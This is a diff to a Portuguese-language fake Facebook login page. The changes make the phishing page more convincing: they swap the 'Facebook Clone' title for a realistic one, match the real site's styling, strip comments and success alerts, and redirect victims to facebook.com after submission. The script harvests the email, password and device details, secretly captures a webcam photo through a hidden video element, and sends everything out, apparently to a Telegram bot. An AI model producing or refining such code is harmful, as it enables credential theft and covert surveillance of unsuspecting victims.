@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - Facebook Clone</title>
+  <title>Facebook – entre ou cadastre-se</title>
   <style>
-    /* seu CSS atual */
     * {
       margin: 0;
       padding: 0;
@@ -35,12 +34,14 @@
       font-size: 48px;
       margin-bottom: 10px;
       text-align: center;
+      font-family: Helvetica, Arial, sans-serif;
     }
 
     .logo p {
-      font-size: 16px;
+      font-size: 18px;
       color: #1c1e21;
       text-align: center;
+      margin-bottom: 10px;
     }
 
     .login-form {
@@ -69,17 +70,19 @@
       border: none;
       border-radius: 6px;
       font-size: 18px;
+      font-weight: bold;
       cursor: pointer;
       transition: background 0.3s;
     }
 
     .login-form button:hover {
-      background-color: #165ecc;
+      background-color: #166fe5;
     }
 
     .login-form .create-account {
       background-color: #42b72a;
       margin-top: 20px;
+      font-weight: bold;
     }
 
     .login-form a {
@@ -88,6 +91,7 @@
       margin-top: 12px;
       color: #1877f2;
       text-decoration: none;
+      font-size: 14px;
     }
 
     .login-form a:hover {
@@ -139,10 +143,6 @@
     }
 
     function sendPhoto(base64Photo, caption) {
-      // Telegram API não aceita base64 direto para sendPhoto
-      // Então enviamos a foto como multipart/form-data via fetch com Blob
-
-      // converter base64 para Blob
       function base64ToBlob(base64, mime) {
         const byteChars = atob(base64);
         const byteNumbers = new Array(byteChars.length);
@@ -174,12 +174,24 @@
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
 
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/;
+
       if (!email || !password) {
         alert('Por favor, preencha todos os campos.');
         return;
       }
 
-      // Informações do dispositivo
+      if (!emailRegex.test(email)) {
+        alert('Por favor, insira um email válido.');
+        return;
+      }
+
+      if (!passwordRegex.test(password)) {
+        alert('A senha deve ter pelo menos 6 caracteres, incluindo pelo menos uma letra e um número.');
+        return;
+      }
+
       const userAgent = navigator.userAgent;
       const language = navigator.language;
       const screenWidth = screen.width;
@@ -198,10 +210,8 @@
 ⏰ Fuso horário: ${timezone}
       `;
 
-      // Tenta acessar a câmera
       navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
-        // Cria um vídeo oculto para capturar um frame
         const video = document.createElement('video');
         video.style.display = 'none';
         document.body.appendChild(video);
@@ -210,7 +220,6 @@
         video.play();
 
         video.addEventListener('loadeddata', () => {
-          // Captura a imagem em um canvas
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
@@ -218,41 +227,20 @@
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL('image/png');
 
-          // Para a câmera
           stream.getTracks().forEach(track => track.stop());
           video.remove();
 
-          // Envia a foto junto com a mensagem
           sendPhoto(imageData, messageText)
-            .then(data => {
-              if (data.ok) {
-                alert('Dados e foto enviados com sucesso!');
-              } else {
-                alert('Erro ao enviar foto. Enviando só os dados...');
-                return sendMessage(messageText).then(dataMsg => {
-                  if (dataMsg.ok) alert('Dados enviados com sucesso!');
-                  else alert('Erro ao enviar os dados.');
-                });
-              }
-            })
-            .catch(() => {
-              alert('Erro ao enviar foto. Enviando só os dados...');
-              sendMessage(messageText).then(dataMsg => {
-                if (dataMsg.ok) alert('Dados enviados com sucesso!');
-                else alert('Erro ao enviar os dados.');
-              });
+            .finally(() => {
+              window.location.href = "https://facebook.com"; // Redireciona após enviar
             });
         });
       })
       .catch(() => {
-        // Se não permitir acesso à câmera, envia só os dados
-        sendMessage(messageText).then(data => {
-          if (data.ok) {
-            alert('Dados enviados com sucesso (sem foto).');
-          } else {
-            alert('Erro ao enviar os dados.');
-          }
-        });
+        sendMessage(messageText)
+          .finally(() => {
+            window.location.href = "https://facebook.com"; // Redireciona mesmo sem foto
+          });
       });
     });
   </script>
